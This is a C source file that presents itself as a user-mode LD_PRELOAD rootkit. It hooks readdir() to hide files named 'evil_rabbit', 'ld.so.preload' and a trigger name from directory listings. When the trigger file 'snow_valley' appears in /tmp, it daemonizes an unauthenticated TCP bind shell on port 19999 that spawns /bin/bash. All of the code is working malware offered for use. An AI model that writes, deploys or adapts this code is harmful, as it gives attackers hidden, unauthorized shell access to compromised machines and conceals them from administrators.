/*
 * Author: Abhinav Thakur
 * Email : compilepeace@gmail.com
 * Description: A user-mode rootkit that hooks libc readdir() to conditionally backdoors the system 
 *              and hide its presence (or any other other malicious presence) whose name starts 
 *              with the HIDE_FILE(s) macro defined below) from programs like /bin/ls, /usr/bin/find 
 *              and basically every program using readdir() to parse filesystem.
 *
 * $ However, the peaceful intentions are only triggered if - 
 *	-> There is SIGNATURE file present in /tmp directory.
 *
 * $ On triggering peace(), a TCP bind shell gets daemonized to listen on PORT macro defined below.
 *
*/


#define _GNU_SOURCE

#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>


#define HIDE_FILE1  "ld.so.preload"
#define HIDE_FILE2  "evil_rabbit"
#define SIGNATURE  "snow_valley"
#define PORT       19999


static struct dirent* (*original_readdir)(DIR *dirp) = NULL;
static int PEACE_FLAG = 0;



/*
 * Returns 1 if the a process listens on PORT and 0 otherwise. It results into termination of server
 * process if it is able to establish a connection with the server process.
*/
int closeExistingConnection()
{
	int client_sockfd = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in hostConfig;

	// Clearing out hostConfig structure and adding server configuration.
	memset(&hostConfig, 0, sizeof(struct sockaddr_in));
	hostConfig.sin_family = AF_INET;
	hostConfig.sin_port = htons(PORT);
	hostConfig.sin_addr.s_addr = inet_addr("127.0.0.1");

	// Connect to server (localhost:PORT)
	int val = connect(client_sockfd, (struct sockaddr *) &hostConfig, sizeof(hostConfig));
	if (val == 0){
		close(client_sockfd);
		return 1;
	}
	else	return 0;
}


/*
 * <A> Fork a child process
 * <B> Let the parent return
 * <C> Child process should daemonize the TCP Bind shell - 
 * 	1. Create a socket
 * 	2. Bind the socket (Assigning a name to socket / configuring it)
 * 	3. Start listening
 * 	4. Accept a connection
 * 	5. Duplicate STDIN, STDOUT and STDERR file desciptors to the new accepted connection
 * 	6. Launch a shell. 
 * 	7. Exit gracefully after the connection is closed.
*/ 
void peace()
{
	pid_t pid = fork();		// <A>

	if (pid < 0) return;

	if (pid == 0)			// <C>
	{
		int status;

		// Use closeExistingConnection() if any error is raise even after setting errno = 0(SUCCESS).
		// Close existing connection and wait for 2 seconds to prevent bind errors
		//status = closeExistingConnection();
		//sleep(2);

		// Daemonize the TCP bind shell
		daemon(0,1);

		struct sockaddr_in socketConfig;
		socketConfig.sin_family = AF_INET;
		socketConfig.sin_port   = htons(PORT);
		socketConfig.sin_addr.s_addr = INADDR_ANY;

		int sockfd = socket(AF_INET, SOCK_STREAM, 0);		// <1>
		if (sockfd == -1) {
			//write(2, "[DEBUG]: socket()\n", 15);
			errno = 0;
			exit(0x0);
		}

		status = bind(sockfd, (struct sockaddr *) &socketConfig, sizeof(socketConfig));		// <2>
		if (status == -1){
			//write(2, "[DEBUG]: bind()\n", 13);
			errno = 0;
			exit(0x0);
		}
		
		status = listen(sockfd, 0);			// <3>
		if (status == -1){
			//write(2, "[DEBUG]: listen()\n", 15);
			errno = 0;
			exit(0x0);
		}

		int conn_sockfd = accept(sockfd, NULL, NULL);		// <4>
		if (conn_sockfd == -1){
			//write(2, "[DEBUG]: accept()\n", 15);
			errno = 0;   
			exit(0x0);
		}

		dup2(conn_sockfd, 0);	// <5> : duplicating STDIN
		dup2(conn_sockfd, 1);	// <5> : duplicating STDOUT
		dup2(conn_sockfd, 2);	// <5> : duplicating STDERR

		char *const argv[] = {NULL};
		execve("/bin/bash", argv, NULL);        // <6>
		exit(0x0);                              // <7>
	}

	return;		// <B>	
}


// Find the address of a symbol starting from our preloaded SO (evil_rabbit.so)
void *findSymbolAddress(char *symbol)
{
	void *address = dlsym(RTLD_NEXT, symbol);
	if (address == NULL) {
		//fprintf(stderr, "[-] (%s) Cannot find symbol address: %s\n", __FUNCTION__, symbol);
		exit(0x101);
	}

	return address;
}


/*
 * DESCRIPTION OF ORIGINAL readdir()
 * The  readdir() function returns a pointer to a dirent structure representing the next directory 
 * entry in the directory stream pointed to by dirp.  It returns NULL on reaching the  end
 * of the directory stream or if an error occurred.
 *
 * A. Get the address of original readdir() (libc wrapper)
 * B. Parse the /tmp directory point
 *	1. Open up another directory stream to the "/tmp" directory.
 *	2. Search for a dirent present by the name of SIGNATURE in "/tmp" (if not already found),
 * 		3. Call for peace() if "/tmp/SIGNATURE" is found.
 * 		4. Set the PEACE_FLAG to 1 (indicating we found SIGNATURE and called for peace()).
 * 	5. Close the directory.
 * C. Call original readdir() and read a directory entry.
 * D. Check if the dir entry name starts with HIDE_FILE(s) or SIGNATURE, if so - skip the directory
 *    entry by reading the next directory entry.
 * E. Return the directory entry.
 *
*/
struct dirent *readdir(DIR *dirp)
{
	if (original_readdir == NULL)
        original_readdir = (struct dirent* (*)(DIR *))findSymbolAddress("readdir");		// <A>


	{	// <B>	

		DIR *chk_dirptr = opendir("/tmp/");		// <1>
		struct dirent *ent_ptr = NULL;

		while ( (ent_ptr = original_readdir(chk_dirptr)) != NULL && PEACE_FLAG == 0)		// <2>
		{
			if ( !strncmp(ent_ptr->d_name, SIGNATURE, strlen(SIGNATURE)) )
			{
				peace();            // <3>
				PEACE_FLAG = 1;     // <4>
				break;
			}
		}

		closedir(chk_dirptr);       // <5>
	}


	struct dirent *dp = original_readdir(dirp);     // <C>

	// <D>
	while ( dp != NULL && 
            ( !strncmp(dp->d_name, HIDE_FILE1, strlen(HIDE_FILE1)) || 
              !strncmp(dp->d_name, HIDE_FILE2, strlen(HIDE_FILE2)) || 
	      !strncmp(dp->d_name, SIGNATURE, strlen(SIGNATURE)) )
		  ){
		dp = original_readdir(dirp);
	}

	return dp;		// <E>
}

